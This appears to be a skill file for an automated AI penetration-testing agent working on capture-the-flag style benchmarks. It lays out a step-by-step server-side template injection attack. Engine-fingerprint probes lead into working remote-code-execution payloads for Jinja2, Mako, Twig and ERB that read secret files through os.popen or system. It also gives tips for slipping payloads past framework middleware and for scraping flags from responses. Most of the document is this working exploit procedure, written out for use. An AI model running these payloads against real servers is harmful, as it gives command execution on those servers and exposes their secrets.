# Skill: SSTI engine-fingerprint-then-escape

Vulnerability class: Server-Side Template Injection (RCE-template).

> **NOT a benchmark recipe.** This skill is class-level technique
> knowledge. It must apply equally to any unknown app whose request
> graph contains the class signature below. If you find yourself
> wanting to write "for XBEN-XXX" or "the flag is in /path", stop —
> that violates `feedback_no_prescriptive_recipes`.

## Class signature

A route matches this class when ALL of the following hold:

1. **Code path**: an `engine.from_string(...)` / `render_template_string(...)`
   / `Mako.Template(...)` / `Twig.compile(...)` / `ERB.new(...)` call
   with a user-controlled input string-concatenated into its argument.
2. **CPG hint**: the `pre-recon-cpg-deliverable.md` lists this call
   under `TEMPLATE_SINKS` with the file:lineno location.
3. **Colocated secret**: a `FILE_SINKS` entry (or hardcoded secret path)
   exists in the same file or sibling module. Without a target to
   exfiltrate, the SSTI is informational only.

If any of (1)-(3) is missing this is NOT the right class — pivot.

## Why this class is high-confidence when CPG flags it

`engine.from_string + request.GET.get` (or its framework equivalent)
is the canonical SSTI primitive. The CPG taint trace eliminates
ambiguity: the dataflow path from user input to the template compile
call is proven, not heuristic. Once confirmed, the only remaining
question is WHICH engine, because the escape payload is engine-specific.

## Phase A — engine fingerprint (max 4 requests)

The skill MUST identify the engine before attempting any escape, because
each engine has a different sandbox model and different bypass.

Probe the user-controlled value with each of:

```
{{7*7}}            ← Jinja2 / Django-template (sometimes)
${7*7}             ← Mako
<%= 7*7 %>         ← ERB
{%print 7*7%}      ← Twig
```

Success criterion: the literal string `49` appears in the response
body. The expression that wins identifies the engine.

If `{{7*7}}` returns echoed-back `{{7*7}}` (not `49`), the engine is
Django-stock (no expression evaluation). In that case the route is
likely informational-only via SSTI — pivot to the colocated FILE_SINKS
class instead, do NOT continue mutating SSTI payloads against an
inert engine.

## Phase B — engine-specific escape (max 6 requests)

Engine-locked. Substitute `$SECRET_PATH` from the colocated FILE_SINKS
entry surfaced by CPG — read it at runtime from the deliverable, never
hard-code.

### Jinja2
```
{{config.__class__.__init__.__globals__['os'].popen('cat $SECRET_PATH').read()}}
```
Fallback when `config` is unavailable:
```
{{''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['os'].popen('cat $SECRET_PATH').read()}}
```
Iterate `N` over the subclasses index until one with `os` in its
globals lands.

### Mako
```
${ self.module.cache.util.os.popen('cat $SECRET_PATH').read() }
```

### Twig
```
{{['cat $SECRET_PATH']|filter('system')}}
```

### ERB
```
<%= IO.read('$SECRET_PATH') %>
```

## Mutation strategy across both phases

After each Phase B request:

1. Regex the response body for `flag\{...\}` or `xbow-[a-f0-9]+` BEFORE
   calling any emit helper. Store the matched bytes in a local variable.
2. Print `AEGISPT_FINDING:` JSON on stdout FIRST (belt-and-braces), THEN
   call the runner's emit helper. A kwarg-typo in the emit call must
   not eat the proof.
3. Exit 0 with a diagnostic JSON line if no engine fingerprinted or
   no flag matched.

## Stop conditions

- 10 requests total used.
- Engine fingerprinted as Django-stock (no eval) → pivot to FILE_SINKS.
- Flag pattern matched → emit + exit 0.
- Phase A returned no engine signal across all 4 probes → not SSTI
  after all, mark `{"ssti": "no-engine-detected"}` and exit 0.

## Phase B framework-layered SSTI (Django + Jinja2 etc.)

When the underlying engine (Jinja2) sits behind a framework that has
its own request-validation middleware (Django ALLOWED_HOSTS, Rails
Host filtering, FastAPI trusted-hosts), the escape payload SHIPS
through the user-controlled value but must NOT modify request
metadata that the framework's middleware inspects.

Hard rules (added 2026-05-28 after empirical XBEN-009 smoke 53 result
where `DisallowedHost at /greet/` blocked the Jinja2 escape):

- **Host header**: always set `Host:` to the target's literal host
  from the BaseURL (the value that worked for the Phase A
  fingerprint). NEVER let the SSTI payload bleed into headers.
- **URL path**: the SSTI payload value goes ONLY in the user-input
  field (query parameter, form field, JSON body), NEVER in the URL
  path. If the path contains the payload, the framework's URL
  resolver will reject it before Jinja2 ever sees it.
- **Charset / encoding**: URL-encode the payload conservatively
  (`urllib.parse.quote` with `safe=''` to encode the `{`, `}`, `'`,
  `_`, `.` characters that some routers reject). Servers vary on
  what they accept raw.
- **Server-error response shapes that are NOT SSTI failures**:
  - `DisallowedHost`, `Bad Request (400)`: framework middleware
    rejected the request shape — NOT the SSTI; payload never
    reached Jinja2. Retry with neutralized request shape.
  - `Internal Server Error 500` with traceback mentioning
    `Jinja2`, `jinja2.exceptions.UndefinedError`, `AttributeError`:
    SSTI engine engaged but the specific escape variant failed.
    Try the NEXT subclass walk index (`__subclasses__()[N+1]`).
  - `200 OK` with the literal payload echoed back: SSTI engine
    did NOT engage. Engine fingerprint was wrong; revisit Phase A.

When the framework is identified as Django + Jinja2 layer (e.g.
`{{7*7}}` returns `49` AND the error page shows Django styling):
write `__import__('os').popen('cat $SECRET_PATH').read()` via the
`__class__.__mro__` walk, but submit it as a POST form body field,
not as a GET query parameter — Django's GET query parser is
stricter about `{`/`}` than its form parser is.

For other framework-layered cases (Rails + ERB, Flask raw + jinja2),
the same principle applies: payload in body, not in URL/header.

## What this skill is NOT

- Not a benchmark answer key. If this file ever names XBEN ids, flags,
  app names, or specific URLs, it has degenerated into solution caching
  and must be reverted.
- Not a generic SSTI scanner. The skill assumes CPG has already
  identified the sink + secret path. Black-box discovery of SSTI is
  a different skill (Phase A becomes the whole flow against every form
  input on every observed page, with vastly worse efficiency).

## Provenance

Format inspired by transilienceai/communitytools (MIT). Content derived
from diagnose-no-flag forensic analysis of smoke 50 (XBEN-009-24,
2026-05-27) where Gemini correctly identified the SSTI primitive but
attempted blind context-variable lookups instead of engine fingerprint,
then crashed on a kwarg-typo even when the escape payload was correct.
